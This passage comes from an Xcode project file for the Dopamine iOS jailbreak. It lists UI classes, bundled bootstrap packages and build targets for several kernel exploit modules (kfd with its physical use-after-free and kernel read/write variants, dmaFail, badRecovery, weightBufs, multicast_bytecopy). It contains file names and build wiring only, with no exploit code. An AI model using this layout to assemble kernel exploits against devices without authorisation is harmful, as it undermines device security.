				042479712B66916B0082581B /* Specifiers */,
				0424796F2B66916B0082581B /* Credits.plist */,
				0424796E2B66916B0082581B /* DOCreditsViewController.h */,
				0424796B2B66916B0082581B /* DOCreditsViewController.m */,
				042479702B66916B0082581B /* DOSettingsController.h */,
				0424796C2B66916B0082581B /* DOSettingsController.m */,
				04DD0B332B7BA38C0055DE4F /* DOLicenseViewController.h */,
				04DD0B342B7BA38C0055DE4F /* DOLicenseViewController.m */,
			);
			path = Settings;
			sourceTree = "<group>";
		};
		042479712B66916B0082581B /* Specifiers */ = {
			isa = PBXGroup;
			children = (
				042479722B66916B0082581B /* DOHeaderCell.h */,
				042479752B66916B0082581B /* DOHeaderCell.m */,
				042479762B66916B0082581B /* DOCreditsCell.h */,
				042479732B66916B0082581B /* DOCreditsCell.m */,
				042479742B66916B0082581B /* DOButtonCell.h */,
				042479772B66916B0082581B /* DOButtonCell.m */,
			);
			path = Specifiers;
			sourceTree = "<group>";
		};
		042479792B66916B0082581B /* Transition */ = {
			isa = PBXGroup;
			children = (
				0424797A2B66916B0082581B /* DOModalTransitionPush.h */,
				0424797D2B66916B0082581B /* DOModalTransitionPush.m */,
				0424797B2B66916B0082581B /* DOModalTransitionScale.h */,
				0424797E2B66916B0082581B /* DOModalTransitionScale.m */,
				0424797F2B66916B0082581B /* DOModalBackAction.h */,
				0424797C2B66916B0082581B /* DOModalBackAction.m */,
			);
			path = Transition;
			sourceTree = "<group>";
		};
		0424798A2B66916B0082581B /* Log */ = {
			isa = PBXGroup;
			children = (
				0424798C2B66916B0082581B /* Indicator */,
				042479982B66916B0082581B /* DOLyricsLogView.h */,
				042479942B66916B0082581B /* DOLyricsLogView.m */,
				0424798B2B66916B0082581B /* DOLyricsLogItemView.h */,
				042479972B66916B0082581B /* DOLyricsLogItemView.m */,
				042479912B66916B0082581B /* DOProgressiveBlurView.h */,
				042479962B66916B0082581B /* DOProgressiveBlurView.m */,
				042479952B66916B0082581B /* DODebugLogView.m */,
				042479922B66916B0082581B /* DODebugLogView.h */,
				042479932B66916B0082581B /* DOLogViewProtocol.h */,
				04DD0B3B2B7C88210055DE4F /* DOLogCrashViewController.h */,
				04DD0B3C2B7C88210055DE4F /* DOLogCrashViewController.m */,
			);
			path = Log;
			sourceTree = "<group>";
		};
		0424798C2B66916B0082581B /* Indicator */ = {
			isa = PBXGroup;
			children = (
				0424798D2B66916B0082581B /* DODoubleHelixIndicator.h */,
				0424798E2B66916B0082581B /* DOLoadingIndicator.m */,
				0424798F2B66916B0082581B /* DOLoadingIndicator.h */,
				042479902B66916B0082581B /* DODoubleHelixIndicator.m */,
			);
			path = Indicator;
			sourceTree = "<group>";
		};
		042479992B66916B0082581B /* ActionMenu */ = {
			isa = PBXGroup;
			children = (
				0424799C2B66916B0082581B /* DOActionMenuButton.h */,
				0424799A2B66916B0082581B /* DOActionMenuButton.m */,
				0424799B2B66916B0082581B /* DOActionMenuView.h */,
				0424799D2B66916B0082581B /* DOActionMenuView.m */,
				0424799E2B66916B0082581B /* DOActionMenuDelegate.h */,
			);
			path = ActionMenu;
			sourceTree = "<group>";
		};
		0443A9AE2B79D9A40014C933 /* PSLists */ = {
			isa = PBXGroup;
			children = (
				0424796D2B66916B0082581B /* DOPSListController.h */,
				042479782B66916B0082581B /* DOPSListController.m */,
				0443A9B02B79D9C10014C933 /* DOPSListItemsController.h */,
				0443A9AF2B79D9C10014C933 /* DOPSListItemsController.m */,
				8C296BAA2BE049E4007C2AD1 /* DOPSExploitListItemsController.h */,
				8C296BAB2BE049E4007C2AD1 /* DOPSExploitListItemsController.m */,
				8C6599DC2C555A71000FF57F /* DOPSJetsamListItemsController.h */,
				8C6599DA2C555A60000FF57F /* DOPSJetsamListItemsController.m */,
			);
			path = PSLists;
			sourceTree = "<group>";
		};
		04C246972B73220400E17924 /* Update */ = {
			isa = PBXGroup;
			children = (
				04C2469B2B73220400E17924 /* DOUpdateViewController.h */,
				04C246982B73220400E17924 /* DOUpdateViewController.m */,
				04C2469A2B73220400E17924 /* DOUpdateCircleView.h */,
				04C246992B73220400E17924 /* DOUpdateCircleView.m */,
				04C2469F2B73225800E17924 /* DODownloadViewController.h */,
				04C246A02B73225800E17924 /* DODownloadViewController.m */,
			);
			name = Update;
			path = Dopamine/UI/Update;
			sourceTree = SOURCE_ROOT;
		};
		04C246A22B74ABD600E17924 /* PkgManagers */ = {
			isa = PBXGroup;
			children = (
				04C246AC2B74ACA200E17924 /* DOAppSwitch.h */,
				04C246AD2B74ACA200E17924 /* DOAppSwitch.m */,
				04C246AF2B74B05800E17924 /* DOPkgManagerPickerView.h */,
				04C246B02B74B05800E17924 /* DOPkgManagerPickerView.m */,
				040622A82B77FE8E00393AAD /* DOPkgManagerPickerViewController.h */,
				040622A92B77FE8E00393AAD /* DOPkgManagerPickerViewController.m */,
				04C246B22B74B65900E17924 /* PkgManagers.plist */,
			);
			path = PkgManagers;
			sourceTree = "<group>";
		};
		04DD0B412B7CBE100055DE4F /* Themes */ = {
			isa = PBXGroup;
			children = (
				04DD0B3F2B7CBD3D0055DE4F /* Themes.plist */,
				04DD0B422B7CBE2E0055DE4F /* DOThemeManager.h */,
				04DD0B432B7CBE2E0055DE4F /* DOThemeManager.m */,
				04DD0B452B7CBEEA0055DE4F /* DOTheme.h */,
				04DD0B462B7CBEEA0055DE4F /* DOTheme.m */,
			);
			path = Themes;
			sourceTree = "<group>";
		};
		8C029F402B4DFCFE0071DE58 /* Jailbreak */ = {
			isa = PBXGroup;
			children = (
				8C029F442B4DFD910071DE58 /* DOBootstrapper.h */,
				8C029F452B4DFD910071DE58 /* DOBootstrapper.m */,
				8C029F612B4E2E140071DE58 /* DOJailbreaker.h */,
				8C029F622B4E2E140071DE58 /* DOJailbreaker.m */,
				8C029F4C2B4E1FF30071DE58 /* DOExploit.h */,
				8C029F4D2B4E1FF30071DE58 /* DOExploit.m */,
				8C029F412B4DFD5D0071DE58 /* DOExploitManager.h */,
				8C029F422B4DFD5D0071DE58 /* DOExploitManager.m */,
				8C029F5E2B4E25350071DE58 /* DOEnvironmentManager.h */,
				8C029F5F2B4E25350071DE58 /* DOEnvironmentManager.m */,
				8C4ABEBC2B52274300B43C9B /* DOPreferenceManager.h */,
				8C4ABEBD2B52274300B43C9B /* DOPreferenceManager.m */,
			);
			path = Jailbreak;
			sourceTree = "<group>";
		};
		8C029F642B4E2E7D0071DE58 /* Frameworks */ = {
			isa = PBXGroup;
			children = (
				8C5FA9432BDD5062008C246F /* CoreML.framework */,
				8C5FA9412BDD503D008C246F /* IOSurface.framework */,
				8C5FA93F2BDD5039008C246F /* IOKit.framework */,
				51AB98D92BBF44390042EA7B /* libpartial.a */,
				8C58E5582B7EAF8000E3ADAA /* CoreServices.framework */,
				042479E42B66B0DD0082581B /* Preferences.framework */,
				8CDD08372B4F682500A32B61 /* IOKit.framework */,
				8CDD08352B4F682000A32B61 /* IOSurface.framework */,
				8CDD08432B4F6DD800A32B61 /* libchoma.dylib */,
				8CDD08422B4F6DD800A32B61 /* libjailbreak.dylib */,
				8CDD08442B4F6DD800A32B61 /* libxpf.dylib */,
				8C029F672B4E31D50071DE58 /* libMobileGestalt.tbd */,
				8C029F652B4E2E7D0071DE58 /* libcompression.tbd */,
				8CDD083B2B4F6D8200A32B61 /* libgrabkernel2.a */,
				8C029F6A2B4E320E0071DE58 /* libz.tbd */,
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
		8C05AFFD2B631443001A7CF3 /* badRecovery */ = {
			isa = PBXGroup;
			children = (
				8C05B0132B6315DB001A7CF3 /* badRecovery.m */,
				8C05B0162B6319D7001A7CF3 /* badRecovery.h */,
				8C05B0172B632925001A7CF3 /* badRecovery.s */,
				8C1FC8422B6460FD00282536 /* Info.plist */,
			);
			path = badRecovery;
			sourceTree = "<group>";
		};
		8C2131762B50CA4B008E682C /* Exploit */ = {
			isa = PBXGroup;
			children = (
				8C2131772B50CA4B008E682C /* libkfd */,
				8C2131902B50CA4B008E682C /* libkfd.h */,
			);
			path = Exploit;
			sourceTree = "<group>";
		};
		8C2131772B50CA4B008E682C /* libkfd */ = {
			isa = PBXGroup;
			children = (
				8C2131782B50CA4B008E682C /* krkw.h */,
				8C2131792B50CA4B008E682C /* krkw */,
				8C2131832B50CA4B008E682C /* info */,
				8C2131882B50CA4B008E682C /* puaf.h */,
				8C2131892B50CA4B008E682C /* common.h */,
				8C21318A2B50CA4B008E682C /* puaf */,
				8C21318E2B50CA4B008E682C /* perf.h */,
				8C21318F2B50CA4B008E682C /* info.h */,
			);
			path = libkfd;
			sourceTree = "<group>";
		};
		8C2131792B50CA4B008E682C /* krkw */ = {
			isa = PBXGroup;
			children = (
				8C21317A2B50CA4B008E682C /* kread */,
				8C21317F2B50CA4B008E682C /* kwrite */,
				8C21317E2B50CA4B008E682C /* IOSurface_shared.h */,
			);
			path = krkw;
			sourceTree = "<group>";
		};
		8C21317A2B50CA4B008E682C /* kread */ = {
			isa = PBXGroup;
			children = (
				8C21317B2B50CA4B008E682C /* kread_sem_open.h */,
				8C21317C2B50CA4B008E682C /* kread_IOSurface.h */,
				8C21317D2B50CA4B008E682C /* kread_kqueue_workloop_ctl.h */,
			);
			path = kread;
			sourceTree = "<group>";
		};
		8C21317F2B50CA4B008E682C /* kwrite */ = {
			isa = PBXGroup;
			children = (
				8C2131802B50CA4B008E682C /* kwrite_IOSurface.h */,
				8C2131812B50CA4B008E682C /* kwrite_sem_open.h */,
				8C2131822B50CA4B008E682C /* kwrite_dup.h */,
			);
			path = kwrite;
			sourceTree = "<group>";
		};
		8C2131832B50CA4B008E682C /* info */ = {
			isa = PBXGroup;
			children = (
				8C2131842B50CA4B008E682C /* static_info.h */,
				8C2131872B50CA4B008E682C /* dynamic_info.h */,
			);
			path = info;
			sourceTree = "<group>";
		};
		8C21318A2B50CA4B008E682C /* puaf */ = {
			isa = PBXGroup;
			children = (
				8C21318B2B50CA4B008E682C /* smith.h */,
				8C21318C2B50CA4B008E682C /* physpuppet.h */,
				8C21318D2B50CA4B008E682C /* landa.h */,
			);
			path = puaf;
			sourceTree = "<group>";
		};
		8C2B1FEE2B5324DE009BA166 /* dmaFail */ = {
			isa = PBXGroup;
			children = (
				8C2B1FEF2B5324DE009BA166 /* dmaFail.h */,
				8C2B1FF12B53251E009BA166 /* dmaFail.c */,
				8C2B1FF32B5325A9009BA166 /* Info.plist */,
			);
			name = dmaFail;
			path = Dopamine/Exploits/dmaFail;
			sourceTree = SOURCE_ROOT;
		};
		8C46D71D2B588857002899DB /* Headers */ = {
			isa = PBXGroup;
			children = (
				8C46D7202B588875002899DB /* zdict.h */,
				8C46D71F2B588875002899DB /* zstd_errors.h */,
				8C46D71E2B588875002899DB /* zstd.h */,
			);
			path = Headers;
			sourceTree = "<group>";
		};
		8C5FA8D52BDD36B6008C246F /* weightBufs */ = {
			isa = PBXGroup;
			children = (
				8C5FA8F72BDD47A5008C246F /* exploit */,
				8C5FA8EF2BDD36F9008C246F /* Info.plist */,
				8C5FA8D62BDD36B6008C246F /* weightBufs.h */,
				8C5FA8F12BDD439A008C246F /* weightBufs.m */,
			);
			path = weightBufs;
			sourceTree = "<group>";
		};
		8C5FA8E52BDD36BF008C246F /* multicast_bytecopy */ = {
			isa = PBXGroup;
			children = (
				8C5FA9452BDD693D008C246F /* exploit */,
				8C5FA8F02BDD3700008C246F /* Info.plist */,
				8C5FA8E62BDD36BF008C246F /* multicast_bytecopy.h */,
				8C5FA8F32BDD43A9008C246F /* multicast_bytecopy.m */,
			);
			path = multicast_bytecopy;
			sourceTree = "<group>";
		};
		8C5FA8F72BDD47A5008C246F /* exploit */ = {
			isa = PBXGroup;
			children = (
				8C5FA9152BDD47D4008C246F /* ANEDirectIn.c */,
				8C5FA9132BDD47D4008C246F /* ANEDirectIn.h */,
				8C5FA9102BDD47D4008C246F /* aneProgram.h */,
				8C5FA90F2BDD47D4008C246F /* AppleNeuralEngine */,
				8C5FA9122BDD47D4008C246F /* exploit.h */,
				8C5FA9142BDD47D4008C246F /* exploit.m */,
				8C5FA9162BDD47D4008C246F /* IOGPU.c */,
				8C5FA9192BDD47D5008C246F /* IOGPU.h */,
				8C5FA8F82BDD47D4008C246F /* iokit.h */,
				8C5FA9112BDD47D4008C246F /* IOSurface.c */,
				8C5FA9182BDD47D5008C246F /* IOSurface.h */,
				8C5FA8F92BDD47D4008C246F /* model_tmp.hwx */,
				8C5FA9172BDD47D5008C246F /* utils.c */,
			);
			path = exploit;
			sourceTree = "<group>";
		};
		8C5FA90F2BDD47D4008C246F /* AppleNeuralEngine */ = {
			isa = PBXGroup;
			children = (
				8C5FA8FA2BDD47D4008C246F /* _ANEClient.h */,
				8C5FA8FB2BDD47D4008C246F /* _ANECloneHelper.h */,
				8C5FA8FC2BDD47D4008C246F /* _ANEDaemonConnection.h */,
				8C5FA8FD2BDD47D4008C246F /* _ANEDaemonProtocol.h */,
				8C5FA8FE2BDD47D4008C246F /* _ANEDataReporter.h */,
				8C5FA8FF2BDD47D4008C246F /* _ANEDeviceController.h */,
				8C5FA9002BDD47D4008C246F /* _ANEDeviceInfo.h */,
				8C5FA9012BDD47D4008C246F /* _ANEErrors.h */,
				8C5FA9022BDD47D4008C246F /* _ANEHashEncoding.h */,
				8C5FA9032BDD47D4008C246F /* _ANEIOSurfaceObject.h */,
				8C5FA9042BDD47D4008C246F /* _ANELog.h */,
				8C5FA9052BDD47D4008C246F /* _ANEModel.h */,
				8C5FA9062BDD47D4008C246F /* _ANEPerformanceStats.h */,
				8C5FA9072BDD47D4008C246F /* _ANEProgramForEvaluation.h */,
				8C5FA9082BDD47D4008C246F /* _ANEQoSMapper.h */,
				8C5FA9092BDD47D4008C246F /* _ANERequest.h */,
				8C5FA90A2BDD47D4008C246F /* _ANEStrings.h */,
				8C5FA90B2BDD47D4008C246F /* AppleNeuralEngine-Structs.h */,
				8C5FA90C2BDD47D4008C246F /* AppleNeuralEngine.h */,
				8C5FA90D2BDD47D4008C246F /* NSCopying.h */,
				8C5FA90E2BDD47D4008C246F /* NSSecureCoding.h */,
			);
			path = AppleNeuralEngine;
			sourceTree = "<group>";
		};
		8C5FA9452BDD693D008C246F /* exploit */ = {
			isa = PBXGroup;
			children = (
				8C5FA9512BDD6C0B008C246F /* exploit.c */,
				8C5FA9592BDD6C0C008C246F /* exploit.h */,
				8C5FA9542BDD6C0C008C246F /* IOGPU.c */,
				8C5FA94E2BDD6C0B008C246F /* IOGPU.h */,
				8C5FA94F2BDD6C0B008C246F /* iokit.h */,
				8C5FA9462BDD6C0B008C246F /* IOSurfaceRoot.c */,
				8C5FA94A2BDD6C0B008C246F /* IOSurfaceRoot.h */,
				8C5FA94D2BDD6C0B008C246F /* kernel_base.c */,
				8C5FA9572BDD6C0C008C246F /* kernel_base.h */,
				8C5FA9532BDD6C0C008C246F /* kernel_rw.c */,
				8C5FA9582BDD6C0C008C246F /* kernel_rw.h */,
				8C5FA9522BDD6C0C008C246F /* mcast.c */,
				8C5FA9472BDD6C0B008C246F /* mcast.h */,
				8C5FA94B2BDD6C0B008C246F /* necp.c */,
				8C5FA9482BDD6C0B008C246F /* necp.h */,
				8C5FA9492BDD6C0B008C246F /* port_utils.c */,
				8C5FA94C2BDD6C0B008C246F /* port_utils.h */,
				8C5FA9552BDD6C0C008C246F /* spray.c */,
				8C5FA9502BDD6C0B008C246F /* spray.h */,
				8C5FA9562BDD6C0C008C246F /* xpaci.h */,
			);
			path = exploit;
			sourceTree = "<group>";
		};
		8C71980C2ABF0E82003C6658 = {
			isa = PBXGroup;
			children = (
				8C7198172ABF0E82003C6658 /* Dopamine */,
				8C7198162ABF0E82003C6658 /* Products */,
				8C029F642B4E2E7D0071DE58 /* Frameworks */,
			);
			sourceTree = "<group>";
		};
		8C7198162ABF0E82003C6658 /* Products */ = {
			isa = PBXGroup;
			children = (
				8C7198152ABF0E82003C6658 /* Dopamine.app */,
				8CDD07A72B4F619000A32B61 /* kfd.framework */,
				8C2B1FDF2B532374009BA166 /* dmaFail.framework */,
				8C05B0032B63152B001A7CF3 /* badRecovery.framework */,
				8C5FA8D42BDD36B6008C246F /* weightBufs.framework */,
				8C5FA8E42BDD36BF008C246F /* multicast_bytecopy.framework */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		8C7198172ABF0E82003C6658 /* Dopamine */ = {
			isa = PBXGroup;
			children = (
				8CB94F012B59E16D0098BAFD /* Resources */,
				8C46D71D2B588857002899DB /* Headers */,
				8C7198332ABF133D003C6658 /* App Delegates */,
				8C9E46262ACA1C5800B5456A /* Extensions */,
				8C7198322ABF130A003C6658 /* Exploits */,
				8C029F402B4DFCFE0071DE58 /* Jailbreak */,
				042479672B66916B0082581B /* UI */,
				8C7198242ABF0E84003C6658 /* Assets.xcassets */,
				8C7198262ABF0E84003C6658 /* LaunchScreen.storyboard */,
				8C7198292ABF0E84003C6658 /* Info.plist */,
				8C71982A2ABF0E84003C6658 /* main.m */,
				04DD0B5B2B7D19E60055DE4F /* Localizable.strings */,
			);
			path = Dopamine;
			sourceTree = "<group>";
		};
		8C7198322ABF130A003C6658 /* Exploits */ = {
			isa = PBXGroup;
			children = (
				8C05AFFD2B631443001A7CF3 /* badRecovery */,
				8CDD07A82B4F619000A32B61 /* kfd */,
				8C2B1FEE2B5324DE009BA166 /* dmaFail */,
				8C5FA8D52BDD36B6008C246F /* weightBufs */,
				8C5FA8E52BDD36BF008C246F /* multicast_bytecopy */,
			);
			path = Exploits;
			sourceTree = "<group>";
		};
		8C7198332ABF133D003C6658 /* App Delegates */ = {
			isa = PBXGroup;
			children = (
				8C7198182ABF0E82003C6658 /* DOAppDelegate.h */,
				8C7198192ABF0E82003C6658 /* DOAppDelegate.m */,
				8C71981B2ABF0E82003C6658 /* DOSceneDelegate.h */,
				8C71981C2ABF0E82003C6658 /* DOSceneDelegate.m */,
			);
			path = "App Delegates";
			sourceTree = "<group>";
		};
		8C9E46262ACA1C5800B5456A /* Extensions */ = {
			isa = PBXGroup;
			children = (
				8CC139802B53DE6C00230143 /* NSData+Hex.h */,
				8CC139812B53DE6C00230143 /* NSData+Hex.m */,
				8C9E46272ACA1C8D00B5456A /* UIImage+Blur.h */,
				8C9E46282ACA1CC700B5456A /* UIImage+Blur.m */,
				8C609C9D2C19AEE70023DD12 /* NSString+Version.h */,
				8C609C9C2C19AECF0023DD12 /* NSString+Version.m */,
				8CBF1A482EC3B71700EB2308 /* UIImage+JPEG2000.h */,
				8CBF1A492EC3B71700EB2308 /* UIImage+JPEG2000.m */,
			);
			path = Extensions;
			sourceTree = "<group>";
		};
		8CB94F012B59E16D0098BAFD /* Resources */ = {
			isa = PBXGroup;
			children = (
				8C05C59E2B759F8A0097A931 /* bootstrap_1800.tar.zst */,
				8C05C59D2B759F8A0097A931 /* bootstrap_1900.tar.zst */,
				8CB94F032B59E17A0098BAFD /* basebin.tar */,
				8CB94F022B59E17A0098BAFD /* basebin.tc */,
				8C512B8B2B5C9DE800C6F14A /* sileo.deb */,
				8C512B8C2B5C9DE800C6F14A /* zebra.deb */,
				8C609C992C19AC250023DD12 /* libkrw-dopamine.deb */,
				8CCD8A832B6F165A004B72B0 /* libroot.deb */,
				8CCD2FC32B77AA9200F9C5DA /* basebin-link.deb */,
				04DD0B362B7BA6180055DE4F /* LICENSE.md */,
				04DD0B392B7BF3E80055DE4F /* LICENSE_libc.md */,
				8C56D4B82B7C0DF2001C03D3 /* LICENSE_ChOma.md */,
				8C56D4BA2B7C0DF2001C03D3 /* LICENSE_dimentio.md */,
				8C56D4BC2B7C0DF2001C03D3 /* LICENSE_ElleKit.md */,
				8C2875202BD850B4008B24DA /* LICENSE_libgrabkernel2.md */,
				8C56D4B92B7C0DF2001C03D3 /* LICENSE_Fugu15_Rootful.md */,
				8C56D4BB2B7C0DF2001C03D3 /* LICENSE_Fugu15.md */,
				8C56D4BE2B7C0DF2001C03D3 /* LICENSE_opainject.md */,
				8C56D4BD2B7C0DF2001C03D3 /* LICENSE_XPF.md */,
				8C56D4C72B7C102B001C03D3 /* LICENSE_Procursus.md */,
				8C56D4C62B7C102B001C03D3 /* LICENSE_Sileo.md */,
				8C56D4C82B7C102B001C03D3 /* LICENSE_Zebra.md */,
				8C56D4CC2B7C118B001C03D3 /* LICENSE_kfd.md */,
				8C5FA9702BDD81EF008C246F /* LICENSE_weightBufs.md */,
				8C296BAD2BE05914007C2AD1 /* LICENSE_plooshinit.md */,
			);
			path = Resources;
			sourceTree = "<group>";
		};
		8CDD07A82B4F619000A32B61 /* kfd */ = {
			isa = PBXGroup;
			children = (
				8C2131762B50CA4B008E682C /* Exploit */,
				8CDD07A92B4F619000A32B61 /* kfd.h */,
				8CDD07B32B4F639100A32B61 /* kfd.m */,
				8C2B1FC72B52FB56009BA166 /* Info.plist */,
			);
			path = kfd;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXHeadersBuildPhase section */
		8C05AFFE2B63152B001A7CF3 /* Headers */ = {
			isa = PBXHeadersBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		8C2B1FDA2B532374009BA166 /* Headers */ = {
			isa = PBXHeadersBuildPhase;
			buildActionMask = 2147483647;
			files = (
				8C2B1FF02B5324DE009BA166 /* dmaFail.h in Headers */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		8C5FA8CF2BDD36B6008C246F /* Headers */ = {
			isa = PBXHeadersBuildPhase;
			buildActionMask = 2147483647;
			files = (
				8C5FA92C2BDD47D5008C246F /* _ANEStrings.h in Headers */,
				8C5FA8D72BDD36B6008C246F /* weightBufs.h in Headers */,
				8C5FA9242BDD47D5008C246F /* _ANEHashEncoding.h in Headers */,
				8C5FA91A2BDD47D5008C246F /* iokit.h in Headers */,
				8C5FA9232BDD47D5008C246F /* _ANEErrors.h in Headers */,
				8C5FA92F2BDD47D5008C246F /* NSCopying.h in Headers */,
				8C5FA91C2BDD47D5008C246F /* _ANEClient.h in Headers */,
				8C5FA9212BDD47D5008C246F /* _ANEDeviceController.h in Headers */,
				8C5FA9252BDD47D5008C246F /* _ANEIOSurfaceObject.h in Headers */,
				8C5FA93A2BDD47D5008C246F /* IOGPU.h in Headers */,
				8C5FA9332BDD47D5008C246F /* exploit.h in Headers */,
				8C5FA91F2BDD47D5008C246F /* _ANEDaemonProtocol.h in Headers */,
				8C5FA92D2BDD47D5008C246F /* AppleNeuralEngine-Structs.h in Headers */,
				8C5FA9202BDD47D5008C246F /* _ANEDataReporter.h in Headers */,
				8C5FA9342BDD47D5008C246F /* ANEDirectIn.h in Headers */,
				8C5FA9272BDD47D5008C246F /* _ANEModel.h in Headers */,
				8C5FA9292BDD47D5008C246F /* _ANEProgramForEvaluation.h in Headers */,
				8C5FA9312BDD47D5008C246F /* aneProgram.h in Headers */,
				8C5FA9302BDD47D5008C246F /* NSSecureCoding.h in Headers */,
				8C5FA9282BDD47D5008C246F /* _ANEPerformanceStats.h in Headers */,
				8C5FA92E2BDD47D5008C246F /* AppleNeuralEngine.h in Headers */,
				8C5FA9392BDD47D5008C246F /* IOSurface.h in Headers */,
				8C5FA92A2BDD47D5008C246F /* _ANEQoSMapper.h in Headers */,
				8C5FA92B2BDD47D5008C246F /* _ANERequest.h in Headers */,
				8C5FA91E2BDD47D5008C246F /* _ANEDaemonConnection.h in Headers */,
				8C5FA91D2BDD47D5008C246F /* _ANECloneHelper.h in Headers */,
				8C5FA9222BDD47D5008C246F /* _ANEDeviceInfo.h in Headers */,
				8C5FA9262BDD47D5008C246F /* _ANELog.h in Headers */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		8C5FA8DF2BDD36BF008C246F /* Headers */ = {
			isa = PBXHeadersBuildPhase;
			buildActionMask = 2147483647;
			files = (
				8C5FA8E72BDD36BF008C246F /* multicast_bytecopy.h in Headers */,
				8C5FA95C2BDD6C0C008C246F /* necp.h in Headers */,
				8C5FA95E2BDD6C0C008C246F /* IOSurfaceRoot.h in Headers */,
				8C5FA96A2BDD6C0C008C246F /* xpaci.h in Headers */,
				8C5FA96D2BDD6C0C008C246F /* exploit.h in Headers */,
				8C5FA9632BDD6C0C008C246F /* iokit.h in Headers */,
				8C5FA9642BDD6C0C008C246F /* spray.h in Headers */,
				8C5FA96B2BDD6C0C008C246F /* kernel_base.h in Headers */,
				8C5FA9622BDD6C0C008C246F /* IOGPU.h in Headers */,
				8C5FA95B2BDD6C0C008C246F /* mcast.h in Headers */,
				8C5FA9602BDD6C0C008C246F /* port_utils.h in Headers */,
				8C5FA96C2BDD6C0C008C246F /* kernel_rw.h in Headers */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		8CDD07A22B4F619000A32B61 /* Headers */ = {
			isa = PBXHeadersBuildPhase;
			buildActionMask = 2147483647;
			files = (
				8C21319C2B50CA4B008E682C /* puaf.h in Headers */,
				8C2131A22B50CA4B008E682C /* info.h in Headers */,
				8C2131A32B50CA4B008E682C /* libkfd.h in Headers */,
				8C2131A12B50CA4B008E682C /* perf.h in Headers */,
				8C2131982B50CA4B008E682C /* kwrite_dup.h in Headers */,
				8C2131962B50CA4B008E682C /* kwrite_IOSurface.h in Headers */,
				8C2131922B50CA4B008E682C /* kread_sem_open.h in Headers */,
				8C21319F2B50CA4B008E682C /* physpuppet.h in Headers */,
				8C2131A02B50CA4B008E682C /* landa.h in Headers */,
				8C2131972B50CA4B008E682C /* kwrite_sem_open.h in Headers */,
				8C21319D2B50CA4B008E682C /* common.h in Headers */,
				8CDD07AA2B4F619000A32B61 /* kfd.h in Headers */,
				8C2131932B50CA4B008E682C /* kread_IOSurface.h in Headers */,
				8C2131992B50CA4B008E682C /* static_info.h in Headers */,
				8C21319B2B50CA4B008E682C /* dynamic_info.h in Headers */,
				8C2131952B50CA4B008E682C /* IOSurface_shared.h in Headers */,
				8C21319E2B50CA4B008E682C /* smith.h in Headers */,
				8C2131912B50CA4B008E682C /* krkw.h in Headers */,
				8C2131942B50CA4B008E682C /* kread_kqueue_workloop_ctl.h in Headers */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXHeadersBuildPhase section */

/* Begin PBXNativeTarget section */
		8C05B0022B63152B001A7CF3 /* badRecovery */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 8C05B00B2B63152C001A7CF3 /* Build configuration list for PBXNativeTarget "badRecovery" */;
			buildPhases = (
				8C05AFFE2B63152B001A7CF3 /* Headers */,
				8C05AFFF2B63152B001A7CF3 /* Sources */,
				8C05B0002B63152B001A7CF3 /* Frameworks */,
				8C05B0012B63152B001A7CF3 /* Resources */,
				8C05B0122B631589001A7CF3 /* ShellScript */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = badRecovery;
			productName = badRecovery;
			productReference = 8C05B0032B63152B001A7CF3 /* badRecovery.framework */;
			productType = "com.apple.product-type.framework";
		};
		8C2B1FDE2B532374009BA166 /* dmaFail */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 8C2B1FE72B532374009BA166 /* Build configuration list for PBXNativeTarget "dmaFail" */;
			buildPhases = (
				8C2B1FDA2B532374009BA166 /* Headers */,
				8C2B1FDB2B532374009BA166 /* Sources */,
				8C2B1FDC2B532374009BA166 /* Frameworks */,
				8C2B1FDD2B532374009BA166 /* Resources */,
				8C2B1FED2B5323A3009BA166 /* Run Script */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = dmaFail;
			productName = dmaFail;
			productReference = 8C2B1FDF2B532374009BA166 /* dmaFail.framework */;
			productType = "com.apple.product-type.framework";
		};
		8C5FA8D32BDD36B6008C246F /* weightBufs */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 8C5FA8DE2BDD36B6008C246F /* Build configuration list for PBXNativeTarget "weightBufs" */;
			buildPhases = (
				8C5FA8CF2BDD36B6008C246F /* Headers */,
				8C5FA8D02BDD36B6008C246F /* Sources */,
				8C5FA8D12BDD36B6008C246F /* Frameworks */,
				8C5FA8D22BDD36B6008C246F /* Resources */,
				8C5FA93D2BDD4FFF008C246F /* ShellScript */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = weightBufs;
			productName = weightBufs;
			productReference = 8C5FA8D42BDD36B6008C246F /* weightBufs.framework */;
			productType = "com.apple.product-type.framework";
		};
		8C5FA8E32BDD36BF008C246F /* multicast_bytecopy */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 8C5FA8EC2BDD36BF008C246F /* Build configuration list for PBXNativeTarget "multicast_bytecopy" */;
			buildPhases = (
				8C5FA8DF2BDD36BF008C246F /* Headers */,
				8C5FA8E02BDD36BF008C246F /* Sources */,
				8C5FA8E12BDD36BF008C246F /* Frameworks */,
				8C5FA8E22BDD36BF008C246F /* Resources */,
				8C5FA93E2BDD501C008C246F /* ShellScript */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = multicast_bytecopy;
			productName = multicast_bytecopy;
			productReference = 8C5FA8E42BDD36BF008C246F /* multicast_bytecopy.framework */;
			productType = "com.apple.product-type.framework";
		};
		8C7198142ABF0E82003C6658 /* Dopamine */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 8C71982E2ABF0E84003C6658 /* Build configuration list for PBXNativeTarget "Dopamine" */;
			buildPhases = (
				8C7198112ABF0E82003C6658 /* Sources */,
				8C7198122ABF0E82003C6658 /* Frameworks */,
				8C7198132ABF0E82003C6658 /* Resources */,
				8C029F5C2B4E21F50071DE58 /* Embed Libraries */,
				8CDD07AE2B4F619000A32B61 /* Embed Frameworks */,
			);
			buildRules = (
			);
			dependencies = (
				8CDD07AC2B4F619000A32B61 /* PBXTargetDependency */,
				8C2B1FE42B532374009BA166 /* PBXTargetDependency */,
